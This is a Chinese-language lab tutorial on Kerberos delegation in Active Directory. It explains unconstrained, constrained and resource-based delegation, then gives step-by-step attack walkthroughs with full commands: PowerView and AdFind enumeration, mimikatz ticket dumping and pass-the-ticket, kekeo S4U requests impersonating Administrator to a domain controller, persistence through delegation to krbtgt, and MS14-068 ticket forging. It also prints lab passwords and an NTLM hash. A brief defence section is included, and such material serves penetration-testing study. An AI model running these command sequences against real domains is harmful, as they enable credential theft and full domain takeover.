# 委派

域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。

服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MSSQL Server在安装时，

会在域内自动注册服务账号'SqlServiceAccount'，这类账号不能用于交互式![1633678607_615ff50f8b322d7c08683.png!small](https://image.3001.net/images/20211008/1633678607_615ff50f8b322d7c08683.png!small)

上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：

    
    
    1. 域内用户jack以Kerberos方式认证后访问Web服务器；
    
    2. Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；
    
    3. KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转fapiao据TGT；
    
    4. websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；
    
    5. KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；
    
    6. websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。

在域中，只有 服务账号 和 主机账号 才具有委派属性

主机账号就是AD活动目录中 Computers 中的计算机，也可以称为机器账号(一个普通域用户默认最多可以创建十个主机账号)。服务账号（Service
Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号
SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。

 **委派的前提**

需要被委派的用户未设置不允许被委派属性，这里如果打勾则Administrator用户不能够被委派

![1633678678_615ff5562dac383688245.png!small](https://image.3001.net/images/20211008/1633678678_615ff5562dac383688245.png!small)

# 非约束性委派

对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。

当服务账号或者主机被设置为非约束性委派时，其 userAccountControl 属性会包含
WORKSTATION_TRUSTED_FOR_DELEGATION

![1633678709_615ff5753bc034c812253.png!small](https://image.3001.net/images/20211008/1633678709_615ff5753bc034c812253.png!small)

![1633678722_615ff582dec1282c8cda5.png!small](https://image.3001.net/images/20211008/1633678722_615ff582dec1282c8cda5.png!small)

从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。

# 约束性委派

由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained
Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy
(Service for User to Proxy)，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。

![1633679886_615ffa0e7a3d9557a4eae.png!small](https://image.3001.net/images/20211008/1633679886_615ffa0e7a3d9557a4eae.png!small)

配置了约束委派的账户的 userAccountControl 属性有个FLAG位
TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性，还会指定对哪个SPN进行委派。

![1633679907_615ffa23c98f16f9b86d9.png!small](https://image.3001.net/images/20211008/1633679907_615ffa23c98f16f9b86d9.png!small)

![1633679936_615ffa408fa0dbbd98cb8.png!small](https://image.3001.net/images/20211008/1633679936_615ffa408fa0dbbd98cb8.png!small)

# 基于资源的约束性委派

为了使用户/资源更加独立，微软在Windows Server
2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行WindowsServer2012和Windows
Server 2012R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束委派的账户的userAccountControl属性为
WORKSTATION_TRUST_ACCOUNT，并且msDS-AllowedToActOnBehalfOfOtherIdentity属性的值为被允许基于资源约束性委派的账号的SID。

![1633679982_615ffa6e7caeeac431065.png!small](https://image.3001.net/images/20211008/1633679982_615ffa6e7caeeac431065.png!small)

# 基于资源的约束性委派和约束性委派差别

委派的权限授予给了拥有资源的后端(B)，而不再是前端(A)

约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林

不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑”msDS-AllowedToActOnBehalfOfOtherIdentity”属性的权限，也就是将计算机加入域的域用户 和 机器自身 拥有权限。

传统的约束委派是“正向的”，通过修改服务A的属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle
Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。

而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。

# 非约束委派和约束委派的流程

# 非约束委派流程

前提：在机器账号B上配置了非约束性委派(域管理员才有权限配置)

1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。

2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B

3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务。

从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。

# 约束性委派流程

前提：在服务A上配置到服务B约束性委派(域管理员才有权限配置)

1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A

2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据。

3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。

从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。

# 筛选非委派属性的账号

注：域控主机账户默认开启非约束委派

# PowerSploit下的PowerView.ps1脚本

    
    
    Import-Module .\\PowerView.ps1;

查询域中配置非约束委派的账户

    
    
    Get-NetUser -Unconstrained -Domain Drunkmars.com
    
    Get-NetUser -Unconstrained -Domain Drunkmars.com \| select name

查询域中配置非约束委派的主机：

    
    
    Get-NetComputer -Unconstrained -Domain Drunkmars.com \| select nam

![1633680322_615ffbc258207dc437a3e.png!small](https://image.3001.net/images/20211008/1633680322_615ffbc258207dc437a3e.png!small)

# ADFind

使用参数

AdFind [switches] [-b basedn] [-f filter] [attr list]

参数说明：

-b：指定要查询的根节点

-f：LDAP过滤条件

attr list：需要显示的属性

查找域中配置非约束委派的用户：

    
    
    AdFind.exe -b "DC=0day,DC=org" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cndistinguishedName

查找域中配置非约束委派的主机：

    
    
    AdFind.exe -b "DC=0day,DC=org" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cndistinguishedName
    

![1633680339_615ffbd35368052c8520c.png!small](https://image.3001.net/images/20211008/1633680339_615ffbd35368052c8520c.png!small)

# ldapsearch

kali自带，可以在域外使用

查找域中配置非约束委派的用户

    
    
    ldapsearch -x -H ldap://192.168.200.143:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\45 -b"DC=0day,DC=org""(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"

查找域中配置非约束委派的主机

    
    
    powershell ldapsearch -x -H ldap://192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\45 -b"DC=0day,DC=org" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep -iE "distinguishedName"

![1633680355_615ffbe31841911dcf133.png!small](https://image.3001.net/images/20211008/1633680355_615ffbe31841911dcf133.png!small)

查询某用户是否具有委派性

    
    
    Import-Module .\\powerview.ps1;
    
    Get-DomainUser 域用户名 -Properties
    useraccountcontrol,msds-allowedtodelegateto| fl

当该账号没委派属性时，查询不出任何信息

当服务账号被设置为 非约束性委派 时，其 userAccountControl 属性会包含为 TRUSTED_FOR_DELEGATION

当被设置为 约束性委派 时，其 userAccountControl 属性包含

    
    
    TRUSTED_TO_AUTH_FOR_DELEGATION

https://msdn.microsoft.com/en-us/library/aa772300%28v=vs.85%29.aspx

且msds-allowedtodelegateto 属性会被设置为哪些 SPN。

# 非约束委派攻击

 **非约束委派** ：当user访问service1时，如果service1的服务账号开启了 unconstrained delegation
（非约束委派），则当 user 访问 service1时会将user的 TGT 发送给 service1 并保存在内存中以备下次重用，然后 service1
就可以利用这张 TGT 以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了

操作环境：

  * 域：Drunkmars.com
  * 域控：windows server 2012R2，主机名：WIN-M836NN6NU8B，IP：192.168.10.5
  * 域管账户：sqladmin
  * 域内主机：windows7，主机名：MESSI-PC，IP：192.168.10.7，用户：mars2(普通域用户)

注：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的

# 查找非约束委派主机帐号

    
    
    Import-Module .\\powerview.ps1;
    
    Get-NetComputer -Unconstrained -Domain Drunkmars.com \| select name

![1633680384_615ffc0086258f99b5fdb.png!small](https://image.3001.net/images/20211008/1633680384_615ffc0086258f99b5fdb.png!small)

# 导出票据

先访问DC，可以看到访问失败

![1633680412_615ffc1c413f15d219dc5.png!small](https://image.3001.net/images/20211008/1633680412_615ffc1c413f15d219dc5.png!small)

用任意域管帐号访问win7(这里域管帐号登录在任意一台机器都可以)

![1633680914_615ffe120004cf341b73f.png!small](https://image.3001.net/images/20211008/1633680914_615ffe120004cf341b73f.png!small)

此时，在主机win8的lsass.exe内存中就会有域用户sqladmin的TGT票据

我们在win8上以管理员权限运行mimikatz，执行以下命令

    
    
    privilege::debug

导出票据

    
    
    sekurlsa::tickets /export

![1633680930_615ffe22a79b0ef97e033.png!small](https://image.3001.net/images/20211008/1633680930_615ffe22a79b0ef97e033.png!small)

# 注入票据

用 mimikatz 将这个票据导入内存中，然后访问域控

导入票据

    
    
    kerberos::ptt [0;33f6ebf]-2-0-60a00000-sqladmin@krbtgt-0DAY.ORG.kirbi

查看票据

    
    
    kerberos::list

![1633680947_615ffe3385e282abdecbf.png!small](https://image.3001.net/images/20211008/1633680947_615ffe3385e282abdecbf.png!small)

# 访问域控

![1633680960_615ffe40144e395049ea5.png!small](https://image.3001.net/images/20211008/1633680960_615ffe40144e395049ea5.png!small)

# 约束性委派攻击

操作环境：

域：0day.org

域内主机：windows 7 ，主机名：PC-jack-0day，IP：192.168.3.62，用户：jack

域控：OWA2010SP3

我们设置了机器用户PC-jack-0day对OWA2010SP3的 cifs 服务的委派

# 查找约束性委派的主机账号

![1633680979_615ffe537aa3f686a1156.png!small](https://image.3001.net/images/20211008/1633680979_615ffe537aa3f686a1156.png!small)

# 请求用户TGT

已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT

    
    
    tgt::ask /user:PC-JACK-0DAY /domain:0day.org /password:password /ticket:test.kirbi

参数：

/user : 服务用户的用户名

/password : 服务用户的明文密码

/domain : 所在域名

/ticket : 指定票据名称，不过这个参数没有生效，可以忽略

kekeo同样也支持使用 NTLM Hash

在请求服务用户的TGT那步直接把 /password 改成 /NTLM 即可

这里我们知道PC-JACK-0DAY的ntlm hash为： **768623e06fae601be0c04759c87d93d3**

执行如下命令

    
    
    tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi

![1633681037_615ffe8d215e7ec2d63ea.png!small](https://image.3001.net/images/20211008/1633681037_615ffe8d215e7ec2d63ea.png!small)

得到TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi

# 获取ST

然后我们可以使用这张TGT通过伪造s4u请求以 administrator 用户身份请求访问 OWA2010SP3 CIFS 的ST

    
    
    tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt\~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org

![1633681066_615ffeaa2a4effdc4a02a.png!small](https://image.3001.net/images/20211008/1633681066_615ffeaa2a4effdc4a02a.png!small)

S4U2Self 获取到的ST1以及 S4U2Proxy 获取到的OWA2010SP3 CIFS服务的ST2会保存在当前目录下

# zhu入ST2

然后我们用mimikatz将ST2导入当前会话即可

    
    
    kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs\~OWA2010SP3.0day.org@0DAY.ORG.kirbi

![1633681151_615ffeffd92f479989b21.png!small](https://image.3001.net/images/20211008/1633681151_615ffeffd92f479989b21.png!small)

# 访问域控

![1633681169_615fff11ee3137810dbff.png!small](https://image.3001.net/images/20211008/1633681169_615fff11ee3137810dbff.png!small)

# 不知道服务用户密码的情况

如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用 mimikatz
直接从内存中把服务用户的TGT dump出来

    
    
    mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

![1633681196_615fff2c014c54631b5e9.png!small](https://image.3001.net/images/20211008/1633681196_615fff2c014c54631b5e9.png!small)

注：sekurlsa::tickets 是列出和导出所有会话的 Kerberos 票据， sekurlsa::tickets 和
kerberos::list不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么sekurlsa::tickets /export
需要管理员权限的原因。并且 sekurlsa::tickets的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。

既然服务用户的TGT导出来了，我们就跳过 tgt::ask 请求TGT这步，直接 tgs::s4u

    
    
    tgs::s4u /tgt:[0;3e7]-2-1-40e00000-PC-JACK-0DAY\$@krbtgt-0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org

![1633681271_615fff777f51c9f18a453.png!small](https://image.3001.net/images/20211008/1633681271_615fff777f51c9f18a453.png!small)

    
    
    kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs\~OWA2010SP3.0day.org@0DAY.ORG.kirbi

![1633681293_615fff8dca2c79aee02c6.png!small](https://image.3001.net/images/20211008/1633681293_615fff8dca2c79aee02c6.png!small)

# 抓包分析约束性委派攻击过程

这里可以看到有6个请求

![1633681315_615fffa302060a51bbee0.png!small](https://image.3001.net/images/20211008/1633681315_615fffa302060a51bbee0.png!small)

# AS-REQ

可以看到用户PC-JACK-0DAY用户向KDC请求一张TGT

![1633681396_615ffff4c09cb0df28560.png!small](https://image.3001.net/images/20211008/1633681396_615ffff4c09cb0df28560.png!small)

# AS-REP

返回一张TGT，这张TGT代表的就是PC-JACK-0DAY这个用户

![1633681417_61600009e79acf0927cec.png!small](https://image.3001.net/images/20211008/1633681417_61600009e79acf0927cec.png!small)

# 第一次的TGS-REQ和TGS-REP

用这张 TGT 发送 S4U2self 请求，以 Administrator 的名义向 TGS 申请了一张访问自身服务的票据，ST1

![1633681460_616000341994d7cf8ebd8.png!small](https://image.3001.net/images/20211008/1633681460_616000341994d7cf8ebd8.png!small)

# 第二次的TGS-REQ和TGS-REP

得到 ST1 之后，然后会带上ST1再次向 KDC 发起 SU42Proxy 请求，以 administrator 的名义请求一张访问 OWA2010SP3
cifs 服务的票据，ST2

![1633681474_61600042e9e7af05ce607.png!small](https://image.3001.net/images/20211008/1633681474_61600042e9e7af05ce607.png!small)

# 利用约束性委派进行权限维持

我们都知道TGT的生成是由 krbtgt 用户加密和签名的，如果我们能委派域上的用户去访问TGS
，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用 krbtgt的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。

注：TGS 默认的spn是 krbtgt/domain name ，我们操作环境是 krbtgt/QIYOU.COM

krbtgt 默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。

我们可以使用powershell来添加

    
    
    Import-Module ActiveDirectory
    
    $user = Get-ADUser test -Properties "msDS-AllowedToDelegateTo"
    
    Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @("krbtgt/0day.org") }

我们控制的用户选择的是自己创建的 test 域用户。密码Yicunyiye123

  * 域控：OWA2010SP3 192.168.200.146
  * 域：0day.org
  * 攻击机：Kali

首先修改 kali 的/etc/hosts/文件，添加如下内容

    
    
    192.168.200.146 0day.org
    
    192.168.200.146 OWA2010SP3

创建域用户test然后赋予SPN

![1633681495_616000573135404496f35.png!small](https://image.3001.net/images/20211008/1633681495_616000573135404496f35.png!small)

![1633681519_6160006f374374128a6e6.png!small](https://image.3001.net/images/20211008/1633681519_6160006f374374128a6e6.png!small)

然后在域控上配置test用户到krbtgt用户的约束性委派

    
    
    Import-Module ActiveDirectory
    
    $user = Get-ADUser test -Properties "msDS-AllowedToDelegateTo"
    
    Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @("krbtgt/0day.org") }

![1633681551_6160008f77e8009609681.png!small](https://image.3001.net/images/20211008/1633681551_6160008f77e8009609681.png!small)

![1633681567_6160009f2f28f701a5393.png!small](https://image.3001.net/images/20211008/1633681567_6160009f2f28f701a5393.png!small)

可以看到test账户具有委派性

![1633681580_616000ac9faed094f18d0.png!small](https://image.3001.net/images/20211008/1633681580_616000ac9faed094f18d0.png!small)

然后在kali上攻击

# 域委派的防御措施

因为委派比较实用我们也不能说直接简单粗暴关闭该功能

1.高权限用户可以设置不能被委派

![1633681597_616000bda16491a5e4d2f.png!small](https://image.3001.net/images/20211008/1633681597_616000bda16491a5e4d2f.png!small)

可以看到administrator是无法成功的，但是sqladmin可以

2.Windows
2012R2及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows2012
R2域服务器，客户端必须为Windows 8.1或之上），不能使用NTLM认证；适用于Windows Server 2016 ， Windows
Server 2012 R2 、 Windows Server 2012

3.一般TGT 4小时后失效

4.Kerberos预认证时不使用DES或者RC4等加密算法

# PAC

原理分析：https://www.anquanke.com/post/id/192810h2-1

kerberos的流程：

1.用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgthash加密的TGT票据

2.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgthash进行解密，如果结果正确，就返回用服务hash
加密的TGS票据

3.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。

上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who
am i?”的问题，并没有解决 “What can I do?”的问题。

在Kerberos最初设计的流程里说明了如何证明客户端的zhenshi身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了
PAC (Privilege Attribute Certificate，特权属性证书) 的概念。

# MS14-068

MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测。systeminfo |find
"3011780"为 空说明该服务器存在MS14-068漏洞

![1633681615_616000cf1902ac027147e.png!small](https://image.3001.net/images/20211008/1633681615_616000cf1902ac027147e.png!small)

环境：

域机器：MESSI-PC，win7，知道一个域用户和密码：mars2\Drunkmars，Fcb0519..，拥有该机器的管理员权限

域控：WIN-M836NN6NU8B，ip:192.168.10.5

# 生成票据

    
    
    MS14-068.exe -u mars2@Drunkmars.com -p Fcb0519.. -s S-1-5-21-652679085-3170934373-4288938398-1107 -d 192.168.10.5

![1633681640_616000e8ae7fe4acf354a.png!small](https://image.3001.net/images/20211008/1633681640_616000e8ae7fe4acf354a.png!small)

可以看到已经生成了TGT_mars2@Drunkmars.com.ccache

# mimikatz导入票据

    
    
    kerberos::ptc 票据路径

![1633681657_616000f9166f1e2b456c4.png!small](https://image.3001.net/images/20211008/1633681657_616000f9166f1e2b456c4.png!small)

# 访问域控

![1633681679_6160010feb706092485da.png!small](https://image.3001.net/images/20211008/1633681679_6160010feb706092485da.png!small)

 **实操推荐：Kerberos网络认证协议搭建与分析**

实操地址：http://mrw.so/6e3cmI

    
    
    Kerberos协议最初是麻省理工学院（MIT）为其Athena项目开发的。本实验主要介绍了windows server2003系统的域和DNS服务器的搭建，通过本实验的学习学会kerberos网络认证协议搭建方式。

